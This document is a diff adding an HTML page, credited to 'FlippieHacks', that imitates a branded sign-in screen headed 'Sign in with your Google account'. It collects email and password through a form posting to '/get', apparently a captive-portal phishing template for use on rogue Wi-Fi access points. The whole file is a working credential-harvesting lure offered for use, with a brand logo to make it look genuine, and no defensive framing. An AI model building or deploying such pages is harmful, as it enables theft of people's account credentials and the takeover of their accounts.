@@ -1,0 +1,204 @@
+<!--By FlippieHacks
+https://github.com/FlippieHacks/ -->
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #af1634;
+  margin-right: 100px
+}
+
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #af1634;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #af1634;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #af1634;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+  <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="500.000000pt" height="50.000000pt" viewBox="0 0 1200.000000 343.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,343.000000) scale(0.100000,-0.100000)"
+fill="#af1634" stroke="none">
+<path d="M0 1715 l0 -1715 6000 0 6000 0 0 1715 0 1715 -6000 0 -6000 0 0
+-1715z m8367 1444 c188 -25 309 -84 433 -208 100 -101 141 -167 186 -299 71
+-211 67 -433 -12 -597 -18 -38 -39 -78 -46 -87 -7 -9 -9 -20 -6 -24 4 -3 107
+-17 230 -30 1234 -129 1568 -165 1596 -169 19 -4 32 -12 32 -21 0 -12 -131
+-14 -1038 -12 l-1038 3 -49 26 c-40 20 -64 45 -122 125 -39 54 -72 103 -72
+108 -1 4 57 5 128 1 213 -12 231 3 231 189 l0 105 30 16 c17 9 30 23 30 32 0
+9 -24 55 -54 102 -29 47 -57 93 -62 101 -4 8 -11 61 -15 118 -5 91 -10 111
+-43 177 -63 127 -154 185 -293 185 -131 0 -293 -54 -468 -156 -283 -164 -342
+-192 -501 -240 -109 -32 -311 -44 -403 -24 -105 23 -195 86 -220 153 -17 45
+-15 47 52 47 131 0 243 33 512 150 471 204 727 264 982 229z m-2337 -585 c30
+-9 59 -19 63 -23 4 -5 1 -50 -7 -102 -17 -106 -34 -129 -92 -129 l-34 0 0 64
+c0 82 -10 91 -106 91 -88 0 -127 -22 -132 -74 -5 -45 14 -62 142 -134 171 -95
+206 -134 206 -228 0 -74 -18 -124 -62 -174 -92 -104 -264 -135 -451 -81 -55
+16 -58 18 -53 44 3 15 10 60 17 101 13 85 33 111 83 111 l34 0 4 -66 c5 -75
+10 -80 86 -90 101 -12 172 30 172 103 0 45 -24 67 -135 127 -49 27 -109 62
+-133 78 -155 106 -74 345 135 398 51 13 195 4 263 -16z m-2125 -1 c-16 -38
+-35 -147 -64 -373 -17 -129 -34 -252 -37 -272 l-7 -38 85 0 85 0 23 50 c13 27
+31 57 41 66 19 17 99 32 99 18 0 -5 -10 -64 -22 -131 l-23 -123 -258 0 c-203
+0 -258 3 -253 13 28 67 50 180 76 387 17 135 33 257 36 273 l6 27 -61 0 -61 0
+25 50 c30 59 31 59 185 63 63 1 119 4 124 5 4 1 5 -6 1 -15z m1325 9 c0 -5 -9
+-17 -20 -27 -22 -20 -169 -223 -269 -372 -56 -84 -63 -101 -77 -180 -8 -49
+-17 -96 -20 -105 -5 -16 2 -18 50 -18 31 0 56 -2 56 -4 0 -18 -34 -78 -52 -90
+-29 -21 -273 -24 -264 -3 19 46 38 126 50 212 l14 100 -75 188 -75 187 -54 0
+-55 0 17 33 c37 72 47 77 160 77 l102 0 7 -32 c9 -43 95 -281 105 -291 7 -8
+171 259 184 301 7 20 15 22 104 25 53 1 100 4 105 5 4 1 7 -2 7 -6z m-4164
+-29 c-3 -16 -11 -64 -17 -107 -14 -91 -32 -116 -83 -116 -31 0 -34 3 -40 38
+-3 20 -6 52 -6 70 l0 32 -65 0 c-36 0 -65 -1 -65 -2 -3 -36 -72 -550 -76 -565
+-6 -22 -4 -23 50 -23 33 0 56 -4 56 -11 0 -16 -20 -51 -43 -76 -19 -22 -28
+-23 -159 -23 -76 0 -138 2 -138 5 0 3 9 23 19 43 10 20 24 55 29 77 11 40 72
+510 72 552 0 21 -5 23 -55 23 l-56 0 -29 -65 c-30 -66 -31 -67 -102 -78 -34
+-5 -34 -2 -11 146 l17 107 354 0 354 0 -6 -27z m580 -10 c-16 -94 -36 -241
+-36 -270 l0 -33 145 0 c109 0 145 3 145 13 0 14 17 137 25 185 l6 32 -56 0
+-55 0 15 38 c27 66 42 72 175 72 l118 0 -8 -32 c-5 -18 -27 -170 -50 -338 -22
+-168 -42 -311 -45 -317 -3 -10 11 -13 50 -13 30 0 55 -2 55 -5 0 -18 -43 -86
+-59 -95 -11 -5 -74 -10 -140 -10 l-120 0 15 43 c20 56 41 156 49 240 l7 67
+-145 0 -146 0 -6 -32 c-3 -18 -11 -72 -18 -120 l-14 -88 54 0 c29 0 53 -2 53
+-5 0 -18 -43 -86 -59 -95 -11 -5 -74 -10 -140 -10 l-120 0 15 43 c24 67 31
+108 63 362 17 132 34 252 37 268 6 27 5 27 -50 27 -31 0 -56 2 -56 5 0 16 42
+85 57 94 10 6 69 11 132 11 l114 0 -7 -37z m1347 10 c2 -16 33 -173 67 -350
+l63 -323 48 0 c27 0 49 -4 49 -9 0 -21 -20 -60 -41 -80 -20 -19 -35 -21 -131
+-21 l-108 0 0 30 c0 33 -27 224 -36 253 -5 15 -19 17 -108 17 l-103 0 -56
+-122 c-31 -68 -61 -135 -66 -150 -10 -28 -11 -28 -106 -28 l-96 0 29 43 c27
+39 115 202 281 520 l71 137 -45 0 c-27 0 -45 5 -45 11 0 18 40 78 58 89 9 5
+74 10 143 10 l127 0 5 -27z m5091 -708 c31 -15 234 -211 225 -218 -2 -2 -94
+-13 -204 -26 -110 -12 -283 -33 -385 -47 -102 -14 -211 -24 -243 -22 -55 4
+-60 7 -117 63 -33 33 -56 63 -52 67 14 14 214 89 335 124 244 73 375 90 441
+59z m3580 -251 c4 -9 4 -19 1 -22 -3 -3 -60 -9 -128 -14 -515 -34 -1269 -120
+-1882 -214 -1761 -269 -3255 -638 -4138 -1023 -131 -57 -171 -67 -210 -52 -26
+10 -227 196 -227 210 0 11 320 132 560 212 860 285 1991 525 3295 698 975 130
+1944 212 2586 219 119 2 138 0 143 -14z"/>
+</g>
+</svg>
+
+
+  
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your Google account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	  
+	  <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+
+      <button class="submit-btn" type="submit">Continue</button>
+
+	<div class="error-message"></div>
+
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Google account if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</body>
+</html>
